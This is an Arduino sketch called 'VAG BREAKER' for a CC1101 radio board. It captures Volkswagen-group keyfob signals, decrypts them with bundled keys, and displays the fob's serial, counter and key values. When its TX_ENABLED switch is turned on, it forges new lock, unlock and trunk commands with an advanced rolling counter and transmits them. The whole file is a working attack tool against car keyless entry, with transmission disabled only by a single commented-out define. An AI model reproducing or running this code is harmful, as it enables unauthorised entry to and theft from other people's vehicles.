#include "CC1101_ESP_Arduino.h"
#include <stdint.h>
#include "VAGDecoder.h"
#include "VAGKeys.h"
#include <LiquidCrystal.h>

/*
 *  Example code for full keyfob decoder/encoder. It is not perfect and has some issues, mainly with vag types 1/2 rx sensitivity, probably because of shorter pulse times than older 3/4 variants.
 *
 *  tested on arduino nano clone with cc1101 v2 blue board
 *  Created on: 9. 8. 2026
 *  Author: Adam Fucik
 *  
 */

//this enables tx, only do this if you understand what are you doing!
//#define TX_ENABLED

//debug data to console
//#define DEBUG

//spi pins matching arduino nano
const int SPI_SCK = 13;
const int SPI_MISO = 12;
const int SPI_MOSI = 11;
const int SPI_CS = 10;
//isr pins
const int RADIO_INPUT_PIN = 3;//dont care
const int RADIO_OUTPUT_PIN = 2;//important

//instances
VagDecoder dec;
CC1101 cc1101(SPI_SCK, SPI_MISO, SPI_MOSI, SPI_CS, RADIO_INPUT_PIN, RADIO_OUTPUT_PIN);
const int rs = A5, en = A4, d4 = A3, d5 = A2, d6 = A1, d7 = A0;
LiquidCrystal lcd(rs, en, d4, d5, d6, d7);

//keyfob and reset buttons
#define RST_BTN 5
#define LOCK_BTN 6
#define TRUNK_BTN 4
#define UNLOCK_BTN 7
//const for packet precorrector and detector
#define PULSE_BUFFER_SIZE 360 //total max for data, ok for ram
#define TYPE_1_2_VAL 300 //const
#define TYPE_3_4_VAL 500 //const
#define TOLERANCE 70 //change as you like, recommend 50 to 100 values, but experiment

//buffers and times
volatile uint16_t timings[PULSE_BUFFER_SIZE];
volatile uint16_t transition_count = 0;
volatile uint32_t last_time = 0;
volatile bool last_level = LOW;
//states
volatile bool packet_ready = false;
volatile bool detected_type12 = false;
volatile bool detected_type34 = false;
volatile uint8_t preamble_count = 0;
volatile bool capturing = false;
//modes for all data about capture
typedef enum {
    MAIN_INFO=0,
    ADVANCED_1=1,
    ADVANCED_2=2,
} DeviceState;
//track
DeviceState currentState = MAIN_INFO;
unsigned long buttonPressedTime = 0;//record button time
bool isPressed = false;//track button time
const unsigned long LONG_PRESS_TIME = 500; // long time const
bool viewingDecoded = true;//lock screen for tx
bool screen_locked = false;//lock screen for tx
bool corr=false;//encode retype corrector -> show X if encode switch from passat 1 to 2 vag type
uint32_t local_cnt;//local count for encode update
uint32_t timer;//measuring presses lenght
//tx bools
volatile bool cc1101_tx_active = false;
//mirrors set radio output pin
#define TX_PIN_BIT  RADIO_OUTPUT_PIN
//apply correction as you like, I will leave this as default 0
#define US_34_CORRECTION 0
#define US_12_CORRECTION 0
uint8_t us_corr=0;
//trying to be as fast as fucc with direct manipulation
inline void cc1101_tx_pulse(bool level, uint16_t dur)
{
    if (!cc1101_tx_active) return;

    if (level)
        PORTD |= _BV(TX_PIN_BIT);
    else
        PORTD &= ~_BV(TX_PIN_BIT);

    delayMicroseconds(dur-us_corr);
}
//encode selected signal with next counter
void encode_and_tx(const VagDecodedSignal* sig, uint32_t counter, uint8_t button) {
    //remove interrupt 
    detachInterrupt(digitalPinToInterrupt(RADIO_OUTPUT_PIN));
    cc1101.setIdle();
    pinMode(RADIO_OUTPUT_PIN, OUTPUT);
    digitalWrite(RADIO_OUTPUT_PIN, LOW);
    //apply correction
    if (sig->vag_type==1 || sig->vag_type==2){
         us_corr=US_12_CORRECTION;
    }
    else{
        us_corr=US_34_CORRECTION;
    }
    //tx mode
    cc1101.setTx();
    noInterrupts();
    cc1101_tx_active = true;

    vag_encode(
        sig->vag_type,
        sig->serial,
        counter,
        button,
        sig->type_byte,
        sig->key_idx,
        cc1101_tx_pulse
    );

    cc1101_tx_active = false;
    interrupts();
    digitalWrite(RADIO_OUTPUT_PIN, LOW);
    //back to rx
    cc1101.setRx();

    pinMode(RADIO_OUTPUT_PIN, INPUT);
    attachInterrupt(
        digitalPinToInterrupt(RADIO_OUTPUT_PIN),
        radioHandlerOnChange,
        CHANGE
    );
}
//handle interrupt
void radioHandlerOnChange() {
    uint32_t now = micros();
    uint32_t duration = now - last_time;
    bool level = digitalRead(RADIO_OUTPUT_PIN);
    
    if (packet_ready) return;

    uint32_t gap_threshold = (detected_type12 && capturing) ? 5000 : 9000;
    
    if (capturing && duration > gap_threshold) {
        packet_ready = true;
        capturing = false;
        return;
    }

    // Preamble detection
    if (!capturing) {
        bool is_type12 = (duration >= (TYPE_1_2_VAL - TOLERANCE) && 
                          duration <= (TYPE_1_2_VAL + TOLERANCE));
        bool is_type34 = (duration >= (TYPE_3_4_VAL - TOLERANCE) && 
                          duration <= (TYPE_3_4_VAL + TOLERANCE));
        
        if (is_type12 || is_type34) {
            preamble_count++;
            //rough approx. for when to start capture
            uint16_t capture_start = is_type12 ? 240 : 70;
            
            if (preamble_count >= capture_start) {
                capturing = true;
                transition_count = 0;
                detected_type12 = is_type12;
                detected_type34 = is_type34;
            }
        } else {
            preamble_count = 0;
        }
    } else {
        // Record sync + data
        if (transition_count < PULSE_BUFFER_SIZE) {
            timings[transition_count++] = duration;
        }
        
        if (transition_count >= PULSE_BUFFER_SIZE) {
            capturing = false;
            packet_ready = true;
        }
    }
    
    last_time = now;
    last_level = level;
}

//helpers for displaying hex
void print_hex_8(LiquidCrystal &lcd, uint8_t val) {
    if (val < 0x10) lcd.print('0');
    lcd.print(val, HEX);
}

void print_hex_16(LiquidCrystal &lcd, uint16_t val) {
    if (val < 0x1000) lcd.print('0');
    if (val < 0x100) lcd.print('0');
    if (val < 0x10) lcd.print('0');
    lcd.print(val, HEX);
}

void print_hex_24(LiquidCrystal &lcd, uint32_t val) {
    if (val < 0x100000) lcd.print('0');
    if (val < 0x10000) lcd.print('0');
    if (val < 0x1000) lcd.print('0');
    if (val < 0x100) lcd.print('0');
    if (val < 0x10) lcd.print('0');
    lcd.print(val, HEX);
}

void print_hex_32(LiquidCrystal &lcd, uint32_t val) {
    if (val < 0x10000000) lcd.print('0');
    if (val < 0x1000000) lcd.print('0');
    if (val < 0x100000) lcd.print('0');
    if (val < 0x10000) lcd.print('0');
    if (val < 0x1000) lcd.print('0');
    if (val < 0x100) lcd.print('0');
    if (val < 0x10) lcd.print('0');
    lcd.print(val, HEX);
}

void state_handler() {
    currentState = (DeviceState)((currentState + 1) % 3);
    const VagDecodedSignal* sig = vag_get_signal(&dec);
    
    switch (currentState) {
        case MAIN_INFO:
            lcd.clear();
            lcd.print(vag_vehicle_name(sig->type_byte));
            lcd.print(" Btn:");
            lcd.print(vag_button_name(sig->button));
            lcd.setCursor(0, 1);
            
            lcd.print("Cnt:");
            print_hex_24(lcd, sig->counter);
            
            lcd.print(" Key:");
            if ((sig->vag_type)==2){//type 2 doesnt use aut64 keys
                    lcd.print("X");        
                    }
                else{
                    lcd.print(sig->key_idx);//used key for decode         
                }
            break;
            
        case ADVANCED_1:
            lcd.clear();
            lcd.print("Ser:");
            print_hex_32(lcd, sig->serial);
            
            lcd.setCursor(0, 1);
            lcd.print("Disp:");
            print_hex_8(lcd, sig->dispatch);
            
            lcd.print(" Typeb:");
            print_hex_8(lcd, sig->type_byte);
            break;
            
        case ADVANCED_2:
            //key1 together
            lcd.clear();
            print_hex_32(lcd, sig->key1_high);
            lcd.setCursor(8, 0);
            print_hex_32(lcd, sig->key1_low);
            
            lcd.setCursor(0, 1);
            print_hex_16(lcd, sig->key2);
            break;
    }
}
//pass the result to decoder and hope it is the correct signal
void pass_to_decoder(bool level, uint32_t dur){
        if (vag_feed(&dec, level, dur)) {
                    const VagDecodedSignal* sig = vag_get_signal(&dec);
                    if (sig && sig->decrypted) {
                        #ifdef DEBUG
                        //debug all data
                        Serial.println("\nVAG DECODED! ");
                        Serial.print("Type:     ");
                        Serial.println(sig->vag_type);
                        Serial.print("Vehicle:  ");
                        Serial.println(vag_vehicle_name(sig->type_byte));
                        Serial.print("Type byte: 0x");
                        Serial.println(sig->type_byte, HEX);
                        Serial.print("Serial:   0x");
                        Serial.println(sig->serial, HEX);
                        Serial.print("CounterHEX:  ");
                        Serial.println(sig->counter,HEX);
                        Serial.print("CounterDEC:  ");
                        Serial.println(sig->counter);
                        Serial.print("Button:   ");
                        Serial.println(vag_button_name(sig->button));
                        Serial.print("Dispatch: 0x");
                        Serial.println(sig->dispatch, HEX);
                        Serial.print("Key idx:  ");
                        Serial.println(sig->key_idx);
                 
                        Serial.print("Key1:     0x");
                        Serial.print(sig->key1_high, HEX);
                        Serial.print(" 0x");
                        Serial.println(sig->key1_low, HEX);
                        Serial.print("Key2:     0x");
                        Serial.println(sig->key2, HEX);
                        Serial.println("\n");
                        #endif
                        lcd.clear();
                        lcd.print("VAG DECODED!");
                        for (uint8_t i=0; i <= 16; i++){//load anim
                            lcd.setCursor(i, 1);
                            lcd.print(".");
                            delay(70);
                        }
                        lcd.clear();
                        viewingDecoded=true;
                        //one time put like main state
                        lcd.clear();
                        lcd.print(vag_vehicle_name(sig->type_byte));//vehicle name
                        lcd.print(" Btn:");
                        lcd.print(vag_button_name(sig->button));//button name lock/unlock/trunk
                        lcd.setCursor(0, 1);
                        
                        lcd.print("Cnt:");
                        print_hex_24(lcd, sig->counter);//counter in hex
                        
                        lcd.print(" Key:");
                        if ((sig->vag_type)==2){//type 2 doesnt use aut64 keys
                           lcd.print("X");        
                        }
                        else{
                           lcd.print(sig->key_idx);//used key for decode         
                        }
                        local_cnt=sig->counter;//save counter to encode +1 on each
                        //now user handles buttons
                        while(viewingDecoded){
                               //user presses
                               byte rst = digitalRead(RST_BTN);
                               byte lck = digitalRead(LOCK_BTN);
                               byte unlck = digitalRead(UNLOCK_BTN);
                               byte trunk = digitalRead(TRUNK_BTN);
                               if (lck == LOW) {//handle long/short presses
                                        screen_locked = true;
                                        currentState = ADVANCED_2;
                                        state_handler();
                                        local_cnt++;
                                        lcd.setCursor(0, 0);
                                        lcd.print(vag_vehicle_name(sig->type_byte));
                                        lcd.print(" Btn:");
                                        lcd.print("Lock  ");
                                        lcd.setCursor(4, 1);
                                        print_hex_24(lcd, local_cnt);
                                        if (corr){
                                            lcd.setCursor(15, 1);
                                            lcd.print("X");
                                        }
                                        #ifdef TX_ENABLED
                                        encode_and_tx(sig, local_cnt, 2);
                                        #endif
                                        //encode func
                                        delay(300);
                                    }  
                               if (unlck == LOW) {
                                        screen_locked = true;
                                        currentState = ADVANCED_2;    
                                        state_handler();
                                        local_cnt++;
                                        lcd.setCursor(0, 0);
                                        lcd.print(vag_vehicle_name(sig->type_byte));
                                        lcd.print(" Btn:");
                                        lcd.print("Unlock");
                                        lcd.setCursor(4, 1);
                                        print_hex_24(lcd, local_cnt);
                                        if (corr){
                                            lcd.setCursor(15, 1);
                                            lcd.print("X");
                                        }
                                        #ifdef TX_ENABLED
                                        encode_and_tx(sig, local_cnt, 1);
                                        #endif
                                        //encode func
                                        delay(300);
                                    }
                               if (trunk == LOW) {
                                        screen_locked = true;
                                        currentState = ADVANCED_2;
                                        state_handler();
                                        local_cnt++;
                                        lcd.setCursor(0, 0);
                                        lcd.print(vag_vehicle_name(sig->type_byte));
                                        lcd.print(" Btn:");
                                        lcd.print("Boot  ");
                                        lcd.setCursor(4, 1);
                                        print_hex_24(lcd, local_cnt);
                                        if (corr){
                                            lcd.setCursor(15, 1);
                                            lcd.print("X");
                                        }
                                        #ifdef TX_ENABLED
                                        encode_and_tx(sig, local_cnt, 4);
                                        #endif
                                        //encode func
                                        delay(300);
                                    }
                               if (rst == LOW) {
                                        if (isPressed == false) {
                                            isPressed = true;
                                            buttonPressedTime = millis();
                                        }
                                    } 
                                else {//released
                                    if (isPressed == true) {
                                        isPressed = false;
                                        unsigned long pressDuration = millis() - buttonPressedTime;//calculate

                                        // long press
                                        if (pressDuration >= LONG_PRESS_TIME) {//reprint and restart
                                            viewingDecoded = false;
                                            lcd.clear();
                                            lcd.print("WAIT. FOR SIGNAL");
                                            lcd.setCursor(10, 1);
                                            lcd.print("434.4M");
                                            packet_ready = false;
                                            transition_count = 0;
                                            preamble_count = 0;
                                            capturing = false;
                                            detected_type12 = false;
                                            detected_type34 = false;
                                            screen_locked = false;
                                            vag_init(&dec);//reinit
                                            last_time = micros();
                                            last_level = digitalRead(RADIO_OUTPUT_PIN);
                                        } else { //short switching
                                            if(!screen_locked){//user cant switch screens after encode, debug only for rx (this is not flipper .-)
                                                state_handler();
                                                delay(300);  
                                            }
                                            else{
                                                continue;
                                            }      
                                        }
                                    }
                            }       
                    }     
                }
        }
}

//set regs and start capture
void setup() {
    Serial.begin(9600);
    delay(1200);
    lcd.begin(16, 2);//init lcd
    vag_keys_init();//load vag keys
    vag_init(&dec);//init decoder as dec
    //buttons for user interface
    pinMode(RST_BTN, INPUT_PULLUP);
    pinMode(LOCK_BTN, INPUT_PULLUP);
    pinMode(UNLOCK_BTN, INPUT_PULLUP);
    pinMode(TRUNK_BTN, INPUT_PULLUP);
    //hello lcd
    lcd.print("VAG BREAKER V1.0");
    lcd.setCursor(0, 1);
    lcd.print("CHECKING CC1101!");
    cc1101.init();//init cc1101
    delay(1200);
    lcd.print("CC1101 OK! ");
    delay(1200);
    lcd.clear();//clean all, checks ok
    lcd.setCursor(0, 0);
    lcd.print("CONFIG. CC1101!");
    //configure cc1101 for raw
    //raw gdo0 capture
    //experimented cc1101 register config, taken from various flipper configs
    //more sensitive, approx 4.8 kbaud with 200 khz bandwidth 
    cc1101.spiWriteReg(CC1101_IOCFG0,    0x0D);
    cc1101.spiWriteReg(CC1101_FSCTRL1,   0x06);
    cc1101.spiWriteReg(CC1101_PKTCTRL1,  0x00);
    cc1101.spiWriteReg(CC1101_PKTCTRL0,  0x32);
    cc1101.spiWriteReg(CC1101_MDMCFG4,   0x87);
    cc1101.spiWriteReg(CC1101_MDMCFG3,   0xA3);
    cc1101.spiWriteReg(CC1101_MDMCFG2,   0x30);
    cc1101.spiWriteReg(CC1101_MDMCFG1,   0x00);
    cc1101.spiWriteReg(CC1101_MDMCFG0,   0x00);
    cc1101.spiWriteReg(CC1101_DEVIATN,   0x00);
    cc1101.spiWriteReg(CC1101_MCSM1,     0x00);
    cc1101.spiWriteReg(CC1101_MCSM0,     0x18);
    cc1101.spiWriteReg(CC1101_FOCCFG,    0x00);
    cc1101.spiWriteReg(CC1101_AGCCTRL2,  0x06);
    cc1101.spiWriteReg(CC1101_AGCCTRL1,  0x00);
    cc1101.spiWriteReg(CC1101_AGCCTRL0,  0x92);
    cc1101.spiWriteReg(CC1101_FREND1,    0xB6);
    cc1101.spiWriteReg(CC1101_FREND0,    0x11);
    cc1101.setTXPwr(TX_PLUS_10_DBM);//set to 10mW+ max (C0)
    cc1101.setMHZ(434.42);//set vag frequency  
    cc1101.setRx();//rx mode
    delay(1200);
    lcd.setCursor(0, 1);
    lcd.print("DONE!");
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("WAIT. FOR SIGNAL");
    lcd.setCursor(10, 1);
    lcd.print("434.4M");
    last_time = micros();
    last_level = digitalRead(RADIO_OUTPUT_PIN);
    //zero this just to be sure
    transition_count = 0;
    packet_ready = false;
    //interrupt for raw edges
    attachInterrupt(
        digitalPinToInterrupt(RADIO_OUTPUT_PIN),
        radioHandlerOnChange,
        CHANGE
    );
    
}
//artificial preamble generator, saving ram space only for data (and sync)
void feed_preamble_type12() {
    bool level = HIGH;
    for (int i = 0; i < 440; i++) {
        pass_to_decoder(level, 300);
        level = !level;
    }
}

void feed_preamble_type34() {
    bool level = HIGH;
    for (int i = 0; i < 90; i++) {
        pass_to_decoder(level, 500);
        level = !level;
    }
}
//data preprocessor and handler, 
void process_data() {
    if (detected_type12) {
        uint16_t gap_idx = 0;
        for (uint16_t i = 0; i < transition_count; i++) {
            if (timings[i] >= 500 && timings[i] <= 750) {
                gap_idx = i;
                break;
            }
        }
        feed_preamble_type12();
        pass_to_decoder(false, timings[gap_idx]);
        for (uint16_t i = gap_idx + 1; i < transition_count; i++) {
            bool level = ((i - (gap_idx + 1)) % 2 == 0);
            pass_to_decoder(level, timings[i]);
        }
        //activate decode with gap
        pass_to_decoder(false, 7000);
        
    } else if (detected_type34) {
        uint16_t sync_start = 0;
        for (uint16_t i = 0; i < transition_count; i++) {
            if (timings[i] >= 900 && timings[i] <= 1100) {
                sync_start = i;
                break;
            }
        }
        feed_preamble_type34();
        for (uint16_t i = sync_start; i < transition_count; i++) {
            bool level = ((i - sync_start) % 2 == 0);
            pass_to_decoder(level, timings[i]);
        }
        //activate decode with gap
        pass_to_decoder(false, 11000);
    }
}


void loop() {
    lcd.setCursor(0, 1);
    //pretty crude, only for visual clue before decode
    lcd.print("RSSI:");
    if (cc1101.getRSSI()<100){
        lcd.print(cc1101.getRSSI());
        lcd.print(" ");
    }
    else{
        lcd.print(cc1101.getRSSI());
    }
    if (packet_ready) {
        #ifdef DEBUG
        Serial.println("PREAMBLE LOCKED - recording data");
        
        if (detected_type12) {
            Serial.println("detected type 1/2 vag signal");
        } else if (detected_type34) {
            Serial.println("detected type 3/4 vag signal");
        }
        
        #endif
        packet_ready=false;
        process_data();                                 
    }
}
